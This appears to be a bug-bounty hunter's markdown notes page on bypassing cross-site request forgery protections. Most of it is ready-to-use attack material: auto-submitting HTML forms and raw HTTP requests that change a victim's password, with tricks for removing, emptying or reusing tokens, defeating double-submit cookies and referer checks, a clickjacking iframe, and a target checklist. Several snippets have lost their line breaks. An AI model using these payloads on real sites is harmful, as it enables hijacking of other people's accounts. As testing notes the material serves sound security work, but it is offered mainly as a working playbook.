# Methodology 
![[Pasted image 20230908032425.png]]


# CSRF Bypasses
    
- ==**ClickJacking**==
        
        ```
        <html> <head> <title>Clickjack test page</title> </head> <body> <p>This page is vulnerable to clickjacking if the iframe is not blank!</p> <iframe src="PAGE_URL" width="500" height="500"></iframe> </body></html>
        ```
        
    - **Change Request Method**
        
        ```
        POST /password_changeHost: email.example.comCookie: session_cookie=YOUR_SESSION_COOKIE(POST request body)new_password=abc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b--------------------------------------------GET /password_change?new_password=abc123Host: email.example.comCookie: session_cookie=YOUR_SESSION_COOKIE
        ```
        
    - **Bypass CSRF Tokens stored on the server**
        
        ```
        # remove the tokenPOST /password_changeHost: email.example.comCookie: session_cookie=YOUR_SESSION_COOKIE(POST request body)new_password=abc123-------------------------------------------------------------<html> <form method="POST" action="https://email.example.com/password_change" id="csrf-form"> <input type="text" name="new_password" value="abc123"> <input type='submit' value="Submit"> </form> <script>document.getElementById("csrf-form").submit();</script></html>----------------------------------------------------------------# Empty ParameterPOST /password_changeHost: email.example.comCookie: session_cookie=YOUR_SESSION_COOKIE(POST request body)new_password=abc123&csrf_token=---------------------------------------------------------------------<html> <form method="POST" action="https://email.example.com/password_change" id"csrf-form"> <input type="text" name="new_password" value="abc123"> <input type="text" name="csrf_token" value=""> <input type='submit' value="Submit"></form> <script>document.getElementById("csrf-form").submit();</script></html>--------------------------# Expected Codedef validate_token(): if (request.csrf_token == session.csrf_token):		 pass else:	 throw_error("CSRF token incorrect. Request rejected.")[...]def process_state_changing_action():	 if request.csrf_token:		 validate_token()		 execute_action()
        ```
        
    - **Weak Token Integriti ( Reuse token )**
        
        ```
        POST /password_changeHost: email.example.comCookie: session_cookie=YOUR_SESSION_COOKIE(POST request body)new_password=abc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b----------------------------------<html> <form method="POST" action="https://email.example.com/password_change" id"csrf-form"> <input type="text" name="new_password" value="abc123"> <input type="text" name="csrf_token" value="871caef0757a4ac9691aceb9aad8b65b "> <input type='submit' value="Submit"></form> <script>document.getElementById("csrf-form").submit();</script></html>--------------------------------------------------------------## Expected Codedef validate_token(): if request.csrf_token:	 if (request.csrf_token in valid_csrf_tokens):			 pass	 else:		 throw_error("CSRF token incorrect. Request rejected.")[...]def process_state_changing_action():	 validate_token()	 execute_action()
        ```
        
    - **Bypass Double submit CSRF tokens**
        
        ```
        # Valid POST /password_changeHost: email.example.comCookie: session_cookie=YOUR_SESSION_COOKIE; csrf_token=871caef0757a4ac9691aceb9aad8b65b(POST request body)new_password=abc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b--------------------------# InvalidPOST /password_changeHost: email.example.comCookie: session_cookie=YOUR_SESSION_COOKIE; csrf_token=1aceb9aad8b65b871caef0757a4ac969(POST request body)new_password=abc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b---------------------------------------# Bypass POST /password_changeHost: email.example.comCookie: session_cookie=YOUR_SESSION_COOKIE; csrf_token=not_a_real_token(POST request body)new_password=abc123&csrf_token=not_a_real_token
        ```
        
    - **Bypass CSRF Referer Header Check**
        
        ```
        # Just Remove The referrer<html> <meta name="referrer" content="no-referrer"> <form method="POST" action="https://email.example.com/password_change" id="csrf-form"> <input type="text" name="new_password" value="abc123"> <input type='submit' value="Submit"> </form> <script>document.getElementById("csrf-form").submit();</script></html>--------------------# Expected Codedef validate_referer(): if (request.referer in allowlisted_domains):pass else: throw_error("Referer incorrect. Request rejected.")[...]def process_state_changing_action(): if request.referer: validate_referer() execute_action()---------------------------# another wayPOST /password_changeHost: email.example.comCookie: session_cookie=YOUR_SESSION_COOKIE;Referer: example.com.attacker.com(POST request body)new_password=abc123------------------# Vulnerable codedef validate_referer(): if request.referer: if ("example.com" in request.referer): pass else: throw_error("Referer incorrect. Request rejected.")[...]def process_state_changing_action(): validate_referer() execute_action()
        ```
        
    - **Bypass CSRF Protection by Using XSS**
        
        Steal victim CSRF Token Via XSS Vulnerability

- Where To Find
    
    1. **Authentication-Required Actions**: Look for actions that require authentication, such as changing account settings, updating passwords, or making transactions. These are common areas where CSRF vulnerabilities can have significant impact.
    2. **User Profile Changes**: Check for actions related to user profile changes, such as updating email addresses, changing personal information, or modifying profile pictures.
    3. **Account Deletion or Suspension**: Actions that allow a user to delete or suspend their account could be targets for CSRF attacks.
    4. **Payment and Transactional Actions**: Look for payment-related actions like making transactions, adding payment methods, or modifying subscription plans.
    5. **Form Submissions**: Any action that involves form submissions could potentially be a target. This includes actions like submitting support tickets, submitting feedback, or submitting any kind of content.
    6. **CSRF Tokens**: Some applications use CSRF tokens as a mitigation technique. Look for instances where CSRF tokens are missing or improperly validated. You might find CSRF tokens in hidden fields within HTML forms or as headers in AJAX requests.
    7. **Third-Party Integrations**: If the application integrates with third-party services or APIs, check if these integrations are susceptible to CSRF attacks.
    8. **Changing Security Settings**: Actions related to changing security settings, like enabling two-factor authentication (2FA) or changing security questions, can also be targets.
    9. **Privilege Escalation**: Actions that involve escalating user privileges, such as changing a user's role or permissions, should be thoroughly tested for CSRF vulnerabilities.
    10. **Logging Out**: Even the logout functionality can be exploited through CSRF attacks, forcing a victim to unknowingly log out.
    11. **Password Reset**: If the password reset process doesn't include proper CSRF protections, an attacker could potentially change a user's password without their consent.

- [ ] **test login, logout, reset pass, change password, add-cart, like, comment, profile change, user details change, balance transfer, subscription, etc**
- [ ] **Use Burp-suite Generated poc**
- [ ] **Change single char**
- [ ] **Sending an empty value of token Replace with the same length**
- [ ] **Clickjacking**
- [ ] **Changing post/get method**
- [ ] **Remove it from the request**
- [ ] **Use another user's valid token**
- [ ] **Crsf protection by Referrer Header? Remove the header [ADD in form <meta name="referrer" content="no-reference">]**
- [ ] **Bypass using subdomain [****[victim.com.attacker.com](http://victim.com.attacker.com/)****]**
- [ ] **Try to decrypt the hash (maybe CSRF is a hash)**
- [ ] **Analyze Token(use burp)**
- [ ] **Gmail -> Mail sent to** **email+2=@gmail.com** **will send to** **email@gmail.com**
- [ ] **CSRF tokens leveraging XSS vulnerabilities**
- [ ] **Sometimes Anti-CSRF token is composed of two parts, one of them remains static while the other one is dynamic."837456mzy29jkd911139" for one request the other time "837456mzy29jkd337221" if you notice, "837456mzy29jkd" part of the token remains same, send the request with only the static part**
- [ ] **Sometimes the anti-csrf check is dependent on User-Agent as well.**
- [ ] **If you try to use a mobile/tablet user agent, the application may not even check for an anti-csrf token.**
### 6 CSRF Bypass by Hack3rSr0lls

[![](https://pbs.twimg.com/media/EY70bxkWkAAFzGb?format=jpg&name=900x900)](https://pbs.twimg.com/media/EY70bxkWkAAFzGb?format=jpg&name=900x900)

